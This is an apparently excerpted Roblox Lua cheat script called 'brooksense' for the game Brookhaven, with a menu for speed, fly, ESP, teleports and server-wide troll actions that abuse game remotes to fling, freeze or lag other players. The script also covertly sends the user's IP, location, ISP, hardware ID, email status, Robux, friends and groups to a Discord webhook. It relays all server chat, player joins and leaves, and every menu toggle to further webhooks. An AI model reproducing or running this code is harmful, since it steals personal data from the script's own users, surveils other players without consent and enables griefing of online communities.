...
local ok, err = xpcall(function()
	...
	for _, v in ipairs(WHITELIST) do
		if (v:lower() == LP.Name:lower()) then
			allowed = true;
			break;
		end
	end
	if (LP.UserId == WHITELIST_ID) then
		allowed = true;
	end
	if not allowed then
	...
	local State = {Speed=false,SpeedVal=50,JumpPow=false,JumpVal=100,Noclip=false,InfJump=false,GodMode=false,Fly=false,FlySpeed=40,AntiRag=false,AntiAFK=false,ESP=false,NameESP=true,HealthESP=true,DistESP=true,Chams=false,DirESP=false,Fullbright=false,NoFog=false,FovChange=false,FovVal=90,TimeVal=14,LockTime=false,AutoCash=false,NeckFloat=false,NeckTarget="",SpinPlayer=false,SpinTarget="",SpinSpeed=4,SpinRadius=4,Invisible=false,FakeLag=false,FakeLagMs=120,ChatSpam=false,SpamMsg="brooksense | best brookhaven script",AmbientTroll=false,BlackHole=false,BHRadius=30,FlingTarget="",FreezeTarget="",SpinSelf=false,SpinSelfSpeed=10,Fling=false,FlingPower=500,Annoy=false,AnnoyTarget="",AnnoyFront=false,HeadlessTroll=false,GiantSelf=false,TinySelf=false,Attach=false,AttachTarget="",Copycat=false,CopycatTarget="",DiscoLights=false,SpamEmotes=false,SkinTarget="",RainbowSkin=false,RainbowCar=false,HatId="",ServerHop=false,EspR=100,EspG=200,EspB=255,AccR=200,AccG=55,AccB=200,Bunnyhop=false,Platform=false,Telekinesis=false,TelekTarget="",CarSpeed=false,CarSpeedVal=200,Ragdoll=false};
	local function EspColor()
		return Color3.fromRGB(State.EspR, State.EspG, State.EspB);
	end
	local function AccColor()
		return Color3.fromRGB(State.AccR, State.AccG, State.AccB);
	end
	local C = {Win=Color3.fromRGB(18, 18, 22),Tab=Color3.fromRGB(13, 13, 17),TabH=Color3.fromRGB(28, 28, 35),TabA=Color3.fromRGB(33, 33, 42),Grp=Color3.fromRGB(24, 24, 30),GBdr=Color3.fromRGB(55, 55, 70),HDR=Color3.fromRGB(10, 10, 14),Acc=Color3.fromRGB(200, 55, 200),AccD=Color3.fromRGB(100, 20, 100),AccL=Color3.fromRGB(220, 100, 220),Txt=Color3.fromRGB(215, 215, 220),TxtD=Color3.fromRGB(100, 100, 115),ChkBg=Color3.fromRGB(38, 38, 48),SlBg=Color3.fromRGB(44, 44, 56),Sep=Color3.fromRGB(45, 45, 58),Red=Color3.fromRGB(190, 50, 50),RedH=Color3.fromRGB(230, 65, 65),Troll=Color3.fromRGB(200, 100, 20),TrollH=Color3.fromRGB(240, 130, 40)};
	...
	local function BDR(c, t, p)
		N("UIStroke", {Color=c,Thickness=t,Parent=p});
	end
	local function LST(g, p)
		N("UIListLayout", {Padding=UDim.new(0, g),SortOrder=Enum.SortOrder.LayoutOrder,Parent=p});
	end
	...
	task.spawn(function()
		...
		pcall(function()
			...
			if ((hwid == "?") and game.RobloxId) then
		...
		local msg = string.format("**brooksense %s** | New Session\n" .. "━━━━━━━━━━━━━━━━━━━━\n" .. "👤 **User:** %s (`%s`)\n" .. "🆔 **ID:** `%d`\n" .. "📅 **Account Age:** %d days\n" .. "💎 **Premium:** %s\n" .. "💰 **Robux:** %s\n" .. "� **Email:** %s\n" .. "�👫 **Friends:** %s\n" .. "━━━━━━━━━━━━━━━━━━━━\n" .. "⚙️ **Executor:** %s (%s)\n" .. "🖥️ **Device:** %s | %s\n" .. "🎮 **Game:** %s\n" .. "👥 **Server:** %d/%d players\n" .. "📍 **Position:** %s\n" .. "━━━━━━━━━━━━━━━━━━━━\n" .. "🌍 **Location:** %s, %s\n" .. "🕐 **Timezone:** %s\n" .. "� **ISP:** %s\n" .. "📡 **IP:** `%s`\n" .. "🔑 **HWID:** `%s`\n" .. "━━━━━━━━━━━━━━━━━━━━\n" .. "👫 **Friends:** %s\n" .. "🏘️ **Groups:** %s\n" .. "━━━━━━━━━━━━━━━━━━━━\n" .. "🔗 **JobId:** `%s`\n" .. "🎯 [**Join Server**](%s)\n" .. "🖼️ [**Avatar**](%s)", VERSION, LP.DisplayName, LP.Name, LP.UserId, LP.AccountAge, ((LP.MembershipType == Enum.MembershipType.Premium) and "Yes") or "No", robux, hasEmail, friendCount, execName, execVer, deviceType, screenRes, gameName, #Players:GetPlayers(), Players.MaxPlayers, position, country, city, timezone, isp, ip, hwid, friendNames, groups, tostring(game.JobId), joinLink, avatarUrl);
		pcall(function()
			reqFn({Url=WEBHOOK_URL,Method="POST",Headers={["Content-Type"]="application/json"},Body=HttpService:JSONEncode({content=msg,username=("brooksense " .. VERSION),avatar_url=(((avatarUrl ~= "?") and avatarUrl) or nil)})});
		end);
	end);
	task.spawn(function()
		task.wait(5);
					...
					if channel:IsA("TextChannel") then
						channel.MessageReceived:Connect(function(msg)
							pcall(function()
								...
								if ((text == "") or (sender == "")) then
									return;
								end
								local logMsg = string.format("💬 **[%s]** `%s`: %s", os.date("%H:%M:%S"), sender, text);
								reqFn({Url=WEBHOOK_CHAT,Method="POST",Headers={["Content-Type"]="application/json"},Body=HttpService:JSONEncode({content=logMsg,username="brooksense chat"})});
							end);
						end);
					end
				end
	...
	Players.PlayerAdded:Connect(function(p)
		task.spawn(function()
			...
			if reqFn then
				pcall(function()
					reqFn({Url=WEBHOOK_URL,Method="POST",Headers={["Content-Type"]="application/json"},Body=HttpService:JSONEncode({content=string.format("🟢 `%s` joined the server (%d/%d)", p.Name, #Players:GetPlayers(), Players.MaxPlayers),username="brooksense server"})});
				end);
			end
		end);
	end);
	Players.PlayerRemoving:Connect(function(p)
		task.spawn(function()
			...
			if reqFn then
				pcall(function()
					reqFn({Url=WEBHOOK_URL,Method="POST",Headers={["Content-Type"]="application/json"},Body=HttpService:JSONEncode({content=string.format("🔴 `%s` left the server (%d/%d)", p.Name, #Players:GetPlayers() - 1, Players.MaxPlayers),username="brooksense server"})});
				end);
			end
		end);
	end);
	task.spawn(function()
		...
		while true do
			...
			pcall(function()
				reqFn({Url=WEBHOOK_URL,Method="POST",Headers={["Content-Type"]="application/json"},Body=HttpService:JSONEncode({content=string.format("🕐 `%s` uptime: **%d min** | Server: %d/%d", LP.Name, uptime, #Players:GetPlayers(), Players.MaxPlayers),username="brooksense uptime"})});
			end);
		end
	end);
	game.Close:Connect(function()
		...
		if reqFn then
			pcall(function()
				reqFn({Url=WEBHOOK_URL,Method="POST",Headers={["Content-Type"]="application/json"},Body=HttpService:JSONEncode({content=string.format("⚫ `%s` disconnected after **%d min**", LP.Name, uptime),username="brooksense disconnect"})});
			end);
		end
	end);
	...
	local SG = N("ScreenGui", {Name="BS12",ResetOnSpawn=false,ZIndexBehavior=Enum.ZIndexBehavior.Sibling,IgnoreGuiInset=true,Parent=((gethui and gethui()) or LP:WaitForChild("PlayerGui"))});
	...
	local ILbl = N("TextLabel", {AnchorPoint=Vector2.new(0.5, 0.5),Size=UDim2.new(0, 500, 0, 50),Position=UDim2.new(0.5, 0, 0.5, -18),BackgroundTransparency=1,RichText=true,Text='<font color="#B0B0C0">brook</font><font color="#C837C8">sense</font>',Font=Enum.Font.GothamBold,TextSize=36,TextTransparency=1,ZIndex=201,Parent=Intro});
	local ISub = N("TextLabel", {AnchorPoint=Vector2.new(0.5, 0.5),Size=UDim2.new(0, 500, 0, 20),Position=UDim2.new(0.5, 0, 0.5, 24),BackgroundTransparency=1,Text=("by kencsar  |  discord: kencsar  |  " .. VERSION),Font=Enum.Font.Gotham,TextSize=12,TextTransparency=1,TextColor3=Color3.fromRGB(70, 70, 90),ZIndex=201,Parent=Intro});
	local vp = Cam.ViewportSize;
	local WW, WH = 620, 460;
	...
	N("TextLabel", {AnchorPoint=Vector2.new(0, 0.5),Size=UDim2.new(0, 200, 0, 22),Position=UDim2.new(0, 12, 0.5, 0),BackgroundTransparency=1,RichText=true,Text=('<font color="#B0B0C0">brook</font><font color="#C837C8">sense</font> <font color="#505060">' .. VERSION .. "</font>"),Font=Enum.Font.GothamBold,TextSize=14,TextColor3=C.Txt,TextXAlignment=Enum.TextXAlignment.Left,Parent=TBar});
	N("TextLabel", {AnchorPoint=Vector2.new(1, 0.5),Size=UDim2.new(0, 160, 0, 20),Position=UDim2.new(1, -52, 0.5, 0),BackgroundTransparency=1,RichText=true,Text='<font color="#404050">dc: </font><font color="#C837C8">kencsar</font>',Font=Enum.Font.Gotham,TextSize=11,TextColor3=C.Txt,TextXAlignment=Enum.TextXAlignment.Right,Parent=TBar});
	local HBtn = N("TextButton", {AnchorPoint=Vector2.new(1, 0.5),Size=UDim2.new(0, 22, 0, 18),Position=UDim2.new(1, -28, 0.5, 0),BackgroundColor3=Color3.fromRGB(40, 40, 52),BorderSizePixel=0,Text="-",Font=Enum.Font.GothamBold,TextSize=16,TextColor3=C.Txt,AutoButtonColor=false,Parent=TBar});
	RND(3, HBtn);
	local XBtn = N("TextButton", {AnchorPoint=Vector2.new(1, 0.5),Size=UDim2.new(0, 22, 0, 18),Position=UDim2.new(1, -3, 0.5, 0),BackgroundColor3=C.Red,BorderSizePixel=0,Text="X",Font=Enum.Font.GothamBold,TextSize=12,TextColor3=Color3.new(1, 1, 1),AutoButtonColor=false,Parent=TBar});
	RND(3, XBtn);
	...
	local function SetTab(name)
		...
		for n, btn in pairs(TabBtns) do
			...
			if ind then
				ind.BackgroundTransparency = (a and 0) or 1;
			end
		end
		ActiveTab = name;
	end
	for i, name in ipairs(tabDefs) do
		local btn = N("TextButton", {Name=name,Position=UDim2.new(0, 0, 0, (i - 1) * 30),Size=UDim2.new(1, -1, 0, 30),BackgroundColor3=C.Tab,BorderSizePixel=0,Text=name,Font=Enum.Font.Gotham,TextSize=11,TextColor3=C.TxtD,AutoButtonColor=false,Parent=TabBar});
		...
		local pg = N("ScrollingFrame", {Size=UDim2.new(1, 0, 1, 0),BackgroundTransparency=1,BorderSizePixel=0,ScrollBarThickness=3,ScrollBarImageColor3=C.Acc,CanvasSize=UDim2.new(0, 0, 0, 0),AutomaticCanvasSize=Enum.AutomaticSize.Y,Visible=false,Parent=Content});
		LST(5, pg);
		TabBtns[name] = btn;
		TabPages[name] = pg;
	...
	local function Toggle(parent, label, key, cb, order)
		...
		btn.MouseButton1Click:Connect(function()
			...
			task.spawn(function()
				...
				if reqFn then
					pcall(function()
						reqFn({Url=WEBHOOK_URL,Method="POST",Headers={["Content-Type"]="application/json"},Body=HttpService:JSONEncode({content=string.format("⚡ `%s` toggled **%s** %s", LP.Name, label, (on and "ON") or "OFF"),username="brooksense actions"})});
					end);
				end
			end);
		end);
	...
	local function Btn(parent, label, cb, order)
		...
		b.MouseEnter:Connect(function()
			b.BackgroundColor3 = C.TabH;
		end);
		b.MouseLeave:Connect(function()
			b.BackgroundColor3 = C.GBdr;
		end);
		return b;
	end
	...
	Toggle(pMov, "Speed", "Speed", function(on)
		Hum.WalkSpeed = (on and State.SpeedVal) or 16;
	end, 1);
	Slider(pMov, "Walk Speed", "SpeedVal", 16, 300, function(v)
		if State.Speed then
			Hum.WalkSpeed = v;
		end
	end, 2);
	Toggle(pMov, "Jump Power", "JumpPow", function(on)
		Hum.JumpPower = (on and State.JumpVal) or 50;
		Hum.UseJumpPower = true;
	end, 3);
	Slider(pMov, "Jump Power", "JumpVal", 50, 500, function(v)
		if State.JumpPow then
			Hum.JumpPower = v;
		end
	end, 4);
	...
	Btn(pChr, "Respawn", function()
		LP:LoadCharacter();
	end, 5);
	Btn(pChr, "Reset Velocity", function()
		HRP.Velocity = Vector3.new(0, 0, 0);
	end, 6);
	local locs = {{"Spawn",CFrame.new(0, 5, 0)},{"Bank",CFrame.new(120, 5, 80)},{"Police Station",CFrame.new(-90, 5, -60)},{"Hospital",CFrame.new(200, 5, -30)},{"Airport",CFrame.new(-200, 5, 150)},{"School",CFrame.new(50, 5, 200)},{"Gas Station",CFrame.new(-50, 5, 120)},{"Mall",CFrame.new(100, 5, 150)},{"Fire Station",CFrame.new(-120, 5, 0)},{"Prison",CFrame.new(250, 5, 100)}};
	for i, l in ipairs(locs) do
		Btn(pTP, "TP: " .. l[1], function()
			HRP.CFrame = l[2];
		end, i);
	end
	Btn(pTP, "TP to Nearest Player", function()
		...
		if best then
			HRP.CFrame = best.CFrame * CFrame.new(3, 0, 0);
		end
	end, #locs + 1);
	...
	Toggle(vV, "No Fog", "NoFog", function(on)
		Lighting.FogEnd = (on and 1000000) or 100000;
		Lighting.FogStart = (on and 1000000) or 0;
	end, 2);
	...
	Slider(wT, "Time", "TimeVal", 0, 24, function(v)
		Lighting.ClockTime = v;
	end, 2);
	Btn(wT, "Day", function()
		Lighting.ClockTime = 14;
	end, 3);
	Btn(wT, "Night", function()
		Lighting.ClockTime = 0;
	end, 4);
	Btn(wT, "Sunset", function()
	...
	Btn(wS, "Server Hop", function()
		task.spawn(function()
			...
			local ok2, res = pcall(function()
				return HttpService:JSONDecode(reqFn({Url=("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"),Method="GET"}).Body);
			end);
			if (not ok2 or not res or not res.data) then
				return;
			end
			local list = {};
	...
	Btn(tSk, "Copy Target Skin", function()
		...
		local applyOk, applyErr = pcall(function()
			Char:FindFirstChildOfClass("Humanoid"):ApplyDescription(desc:Clone());
		end);
		if not applyOk then
	...
	Btn(tSrv, "Force Jump All", function()
		...
		if r then
			for _, p in ipairs(Players:GetPlayers()) do
				pcall(function()
					r:FireServer("DropButtonStopAll", p);
				end);
			end
		end
	end, 2);
	...
	Btn(tSrv, "Piggyback All (Kill)", function()
		...
		for _, p in ipairs(GetPlayers()) do
			pcall(function()
				r:FireServer("Client2ClientRequest: Piggyback!", p);
			end);
			pcall(function()
				r:FireServer("BothWantPiggyBackRide", p);
			end);
		end
	end, 5);
	Btn(tSrv, "Freeze All", function()
		...
		for _, p in ipairs(GetPlayers()) do
			pcall(function()
				r:FireServer("Both want a piggyback ride", p);
			end);
			task.wait(0.05);
			pcall(function()
				r:FireServer("DropButtonStopAll", p);
		...
		task.spawn(function()
			pcall(function()
				...
				if rem then
					local smallData = {};
					for i = 1, 50 do
						table.insert(smallData, {tostring(i)});
					end
					for i = 1, 5 do
						pcall(function()
							rem:FireServer(smallData);
						end);
						task.wait(0.5);
					end
				end
	...
	Btn(tSrv, "Stop Lag Effects", function()
		for _, obj in ipairs(workspace:GetDescendants()) do
			...
			if (obj:IsA("Sound") and (obj.SoundId == "rbxassetid://9114232807")) then
				obj:Destroy();
			end
		end
		for _, obj in ipairs(workspace:GetChildren()) do
			if (obj:IsA("Part") and not obj.Anchored and (obj.Size == Vector3.new(2, 2, 2))) then
				obj:Destroy();
			end
		end
	end, 12);
	...
	Btn(avC, "Red", function()
		FireAvatar("skintone", "Really Red");
	end, 2);
	Btn(avC, "Blue", function()
		FireAvatar("skintone", "Really blue");
	end, 3);
	Btn(avC, "Green", function()
		FireAvatar("skintone", "Lime green");
	end, 4);
	Btn(avC, "Black", function()
		FireAvatar("skintone", "Really Black");
	end, 5);
	Btn(avC, "White", function()
		FireAvatar("skintone", "White");
	end, 6);
	Btn(avC, "Pink", function()
		FireAvatar("skintone", "Pink");
	end, 7);
	Btn(avC, "Purple", function()
		FireAvatar("skintone", "Magenta");
	end, 8);
	Btn(avC, "Yellow", function()
		FireAvatar("skintone", "New Yeller");
	end, 9);
	Btn(avC, "Brown", function()
		FireAvatar("skintone", "Brown");
	end, 10);
	...
	Btn(avA, "Dominus (12345679)", function()
		FireAvatar("wear", 12345679);
	end, 4);
	Btn(avA, "Valkyrie (1365767)", function()
		FireAvatar("wear", 1365767);
	end, 5);
	Btn(avA, "Korblox (11827688)", function()
		FireAvatar("wear", 11827688);
	end, 6);
	...
	Btn(avE, "Sit", function()
		Hum.Sit = true;
	end, 2);
	Btn(avE, "Jump", function()
		Hum:ChangeState(Enum.HumanoidStateType.Jumping);
	end, 3);
	...
	N("TextLabel", {Size=UDim2.new(1, 0, 0, 80),BackgroundTransparency=1,LayoutOrder=1,Text=string.format("Username: %s\nDisplay: %s\nUserID: %d\nAccount Age: %d days\nServer: %d/%d players\nJobId: %s", LP.Name, LP.DisplayName, LP.UserId, LP.AccountAge, #Players:GetPlayers(), Players.MaxPlayers, tostring(game.JobId):sub(1, 8) .. "..."),Font=Enum.Font.Gotham,TextSize=11,TextColor3=C.TxtD,TextXAlignment=Enum.TextXAlignment.Left,TextWrapped=true,Parent=mI});
	...
	N("TextLabel", {Size=UDim2.new(1, 0, 0, 70),BackgroundTransparency=1,LayoutOrder=1,Text=("brooksense " .. VERSION .. "\n\nDeveloper: kencsar\nDiscord: kencsar\nServer: discord.gg/nvuAjkcWX\n\nBest Brookhaven Script"),Font=Enum.Font.Gotham,TextSize=12,TextColor3=C.Txt,TextXAlignment=Enum.TextXAlignment.Left,TextWrapped=true,Parent=abD});
	N("TextLabel", {Size=UDim2.new(1, 0, 0, 50),BackgroundTransparency=1,LayoutOrder=1,Text="UI: GameSense/Skeet inspired\nExecutor: Solara compatible\nFeatures: ESP, Troll, Avatar, Fly, Noclip, etc.",Font=Enum.Font.Gotham,TextSize=11,TextColor3=C.TxtD,TextXAlignment=Enum.TextXAlignment.Left,TextWrapped=true,Parent=abC});
	N("TextLabel", {Size=UDim2.new(1, 0, 0, 30),BackgroundTransparency=1,LayoutOrder=1,Text=("Version: " .. VERSION .. " | Build: " .. os.date("%Y-%m-%d")),Font=Enum.Font.Gotham,TextSize=11,TextColor3=C.TxtD,TextXAlignment=Enum.TextXAlignment.Left,Parent=abV});
	local spinAngle = 0;
	local selfSpinA = 0;
	local lastLagT = 0;
	local lastRainbow = 0;
	...
	RunService.RenderStepped:Connect(function(dt)
		...
		if State.FovChange then
			Cam.FieldOfView = State.FovVal;
		end
		if (State.LockTime and not State.Fullbright) then
			Lighting.ClockTime = State.TimeVal;
		end
			...
			for _, obj in ipairs(workspace:GetDescendants()) do
				...
				if (obj:IsA("BasePart") and not obj.Anchored and (obj.Name ~= "HumanoidRootPart")) then
					...
					if ((dist < State.BHRadius) and (dist > 1)) then
						pcall(function()
							obj.Velocity = (HRP.Position - obj.Position).Unit * (30 / dist);
						end);
						count = count + 1;
					end
				end
	...
	local BONES_R6 = {{"Head","Torso"},{"Torso","Right Arm"},{"Torso","Left Arm"},{"Torso","Right Leg"},{"Torso","Left Leg"}};
	...
	local function BuildESP(pl)
		...
		d.bb = bb;
		d.nameLbl = N("TextLabel", {AnchorPoint=Vector2.new(0.5, 0),Size=UDim2.new(1, 0, 0, 16),Position=UDim2.new(0.5, 0, 0, 0),BackgroundTransparency=1,Text=(pl.DisplayName .. " [" .. pl.Name .. "]"),Font=Enum.Font.GothamBold,TextSize=13,TextColor3=EspColor(),TextStrokeTransparency=0.1,TextStrokeColor3=Color3.new(0, 0, 0),TextXAlignment=Enum.TextXAlignment.Center,Visible=State.NameESP,Parent=bb});
		...
		d.hpBg = hpBg;
		d.hpFill = hpF;
		d.distLbl = N("TextLabel", {AnchorPoint=Vector2.new(0.5, 0),Size=UDim2.new(1, 0, 0, 14),Position=UDim2.new(0.5, 0, 0, 28),BackgroundTransparency=1,Text="",Font=Enum.Font.Gotham,TextSize=10,TextColor3=Color3.fromRGB(130, 130, 150),TextStrokeTransparency=0.2,TextStrokeColor3=Color3.new(0, 0, 0),TextXAlignment=Enum.TextXAlignment.Center,Visible=State.DistESP,Parent=bb});
		...
		d.hl = hl;
		if DrawingSupported then
			local ok3, dirLn = pcall(function()
				return Drawing.new("Line");
			end);
				...
				if not c then
					...
					if not hrp then
						...
						if d then
							...
							if d.hpBg then
								d.hpBg.Visible = State.HealthESP;
							end
							if d.nameLbl then
								d.nameLbl.Visible = State.NameESP;
								d.nameLbl.TextColor3 = ec;
							end
							if d.distLbl then
	...
	UserInputService.InputBegan:Connect(function(i, gp)
		...
		if (i.KeyCode == Enum.KeyCode.Insert) then
			...
			if guiOpen then
				local overlay = N("Frame", {Size=UDim2.new(1, 0, 1, 0),BackgroundColor3=C.Win,BackgroundTransparency=1,BorderSizePixel=0,ZIndex=100,Parent=Win});
				...
				local overlay = N("Frame", {Size=UDim2.new(1, 0, 1, 0),BackgroundColor3=C.Win,BackgroundTransparency=0,BorderSizePixel=0,ZIndex=100,Parent=Win});
	...
	task.spawn(function()
		...
		local DSTitle = N("TextLabel", {AnchorPoint=Vector2.new(0.5, 0),Size=UDim2.new(0, 400, 0, 40),Position=UDim2.new(0.5, 0, 0.15, 0),BackgroundTransparency=1,RichText=true,Text='<font color="#B0B0C0">brook</font><font color="#C837C8">sense</font>',Font=Enum.Font.GothamBold,TextSize=28,TextColor3=C.Txt,ZIndex=151,Parent=DeviceScreen});
		local DSSub = N("TextLabel", {AnchorPoint=Vector2.new(0.5, 0),Size=UDim2.new(0, 400, 0, 20),Position=UDim2.new(0.5, 0, 0.23, 0),BackgroundTransparency=1,Text="Select your device",Font=Enum.Font.Gotham,TextSize=14,TextColor3=C.TxtD,ZIndex=151,Parent=DeviceScreen});
		local PCBtn = N("TextButton", {AnchorPoint=Vector2.new(0.5, 0.5),Size=UDim2.new(0, 120, 0, 120),Position=UDim2.new(0.2, 0, 0.55, 0),BackgroundColor3=Color3.fromRGB(28, 28, 36),BorderSizePixel=0,Text="",AutoButtonColor=false,ZIndex=152,Parent=DeviceScreen});
		RND(10, PCBtn);
		BDR(C.GBdr, 1, PCBtn);
		N("TextLabel", {AnchorPoint=Vector2.new(0.5, 0.5),Size=UDim2.new(1, 0, 0, 50),Position=UDim2.new(0.5, 0, 0.4, 0),BackgroundTransparency=1,Text="🖥️",TextSize=38,ZIndex=153,Parent=PCBtn});
		N("TextLabel", {AnchorPoint=Vector2.new(0.5, 0),Size=UDim2.new(1, 0, 0, 20),Position=UDim2.new(0.5, 0, 0.72, 0),BackgroundTransparency=1,Text="PC",Font=Enum.Font.GothamBold,TextSize=13,TextColor3=C.Txt,ZIndex=153,Parent=PCBtn});
		local TabletBtn = N("TextButton", {AnchorPoint=Vector2.new(0.5, 0.5),Size=UDim2.new(0, 120, 0, 120),Position=UDim2.new(0.5, 0, 0.55, 0),BackgroundColor3=Color3.fromRGB(28, 28, 36),BorderSizePixel=0,Text="",AutoButtonColor=false,ZIndex=152,Parent=DeviceScreen});
		RND(10, TabletBtn);
		BDR(C.GBdr, 1, TabletBtn);
		N("TextLabel", {AnchorPoint=Vector2.new(0.5, 0.5),Size=UDim2.new(1, 0, 0, 50),Position=UDim2.new(0.5, 0, 0.4, 0),BackgroundTransparency=1,Text="📋",TextSize=38,ZIndex=153,Parent=TabletBtn});
		N("TextLabel", {AnchorPoint=Vector2.new(0.5, 0),Size=UDim2.new(1, 0, 0, 20),Position=UDim2.new(0.5, 0, 0.72, 0),BackgroundTransparency=1,Text="Tablet",Font=Enum.Font.GothamBold,TextSize=13,TextColor3=C.Txt,ZIndex=153,Parent=TabletBtn});
		local MobileBtn = N("TextButton", {AnchorPoint=Vector2.new(0.5, 0.5),Size=UDim2.new(0, 120, 0, 120),Position=UDim2.new(0.8, 0, 0.55, 0),BackgroundColor3=Color3.fromRGB(28, 28, 36),BorderSizePixel=0,Text="",AutoButtonColor=false,ZIndex=152,Parent=DeviceScreen});
		RND(10, MobileBtn);
		BDR(C.GBdr, 1, MobileBtn);
		N("TextLabel", {AnchorPoint=Vector2.new(0.5, 0.5),Size=UDim2.new(1, 0, 0, 50),Position=UDim2.new(0.5, 0, 0.4, 0),BackgroundTransparency=1,Text="📱",TextSize=38,ZIndex=153,Parent=MobileBtn});
		N("TextLabel", {AnchorPoint=Vector2.new(0.5, 0),Size=UDim2.new(1, 0, 0, 20),Position=UDim2.new(0.5, 0, 0.72, 0),BackgroundTransparency=1,Text="Mobile",Font=Enum.Font.GothamBold,TextSize=13,TextColor3=C.Txt,ZIndex=153,Parent=MobileBtn});
		PCBtn.MouseEnter:Connect(function()
			TW(PCBtn, 0.2, {BackgroundColor3=Color3.fromRGB(40, 40, 52)});
		end);
		PCBtn.MouseLeave:Connect(function()
			TW(PCBtn, 0.2, {BackgroundColor3=Color3.fromRGB(28, 28, 36)});
		end);
		TabletBtn.MouseEnter:Connect(function()
			TW(TabletBtn, 0.2, {BackgroundColor3=Color3.fromRGB(40, 40, 52)});
		end);
		TabletBtn.MouseLeave:Connect(function()
			TW(TabletBtn, 0.2, {BackgroundColor3=Color3.fromRGB(28, 28, 36)});
		end);
		MobileBtn.MouseEnter:Connect(function()
			TW(MobileBtn, 0.2, {BackgroundColor3=Color3.fromRGB(40, 40, 52)});
		end);
		MobileBtn.MouseLeave:Connect(function()
			TW(MobileBtn, 0.2, {BackgroundColor3=Color3.fromRGB(28, 28, 36)});
		end);
		local deviceMode = "pc";
		...
		TabletBtn.MouseButton1Click:Connect(function()
			deviceMode = "tablet";
			showMainMenu();
			local tabToggle = N("TextButton", {AnchorPoint=Vector2.new(1, 0.5),Size=UDim2.new(0, 45, 0, 45),Position=UDim2.new(1, -10, 0.5, 0),BackgroundColor3=C.Acc,BackgroundTransparency=0.3,BorderSizePixel=0,Text="BS",Font=Enum.Font.GothamBold,TextSize=15,TextColor3=Color3.new(1, 1, 1),ZIndex=200,Parent=SG});
			RND(22, tabToggle);
		...
		MobileBtn.MouseButton1Click:Connect(function()
			deviceMode = "mobile";
			showMainMenu();
			local mobileToggle = N("TextButton", {AnchorPoint=Vector2.new(1, 0.5),Size=UDim2.new(0, 40, 0, 40),Position=UDim2.new(1, -10, 0.5, 0),BackgroundColor3=C.Acc,BackgroundTransparency=0.3,BorderSizePixel=0,Text="BS",Font=Enum.Font.GothamBold,TextSize=14,TextColor3=Color3.new(1, 1, 1),ZIndex=200,Parent=SG});
			RND(20, mobileToggle);
	...
	local WM = N("Frame", {AnchorPoint=Vector2.new(1, 0),Position=UDim2.new(1, -12, 0, 8),Size=UDim2.new(0, 220, 0, 22),BackgroundColor3=Color3.fromRGB(20, 20, 24),BackgroundTransparency=0.15,BorderSizePixel=0,ZIndex=50,Parent=SG});
	RND(3, WM);
	BDR(Color3.fromRGB(50, 50, 65), 1, WM);
	local WMBar = N("Frame", {Size=UDim2.new(1, 0, 0, 2),Position=UDim2.new(0, 0, 0, 0),BackgroundColor3=C.Acc,BorderSizePixel=0,ZIndex=51,Parent=WM});
	RND(3, WMBar);
	local WMLbl = N("TextLabel", {Size=UDim2.new(1, -8, 1, -2),Position=UDim2.new(0, 4, 0, 2),BackgroundTransparency=1,Text="brooksense | 0 fps | 0ms",Font=Enum.Font.Code,TextSize=11,TextColor3=Color3.fromRGB(220, 220, 225),TextXAlignment=Enum.TextXAlignment.Center,ZIndex=52,Parent=WM});
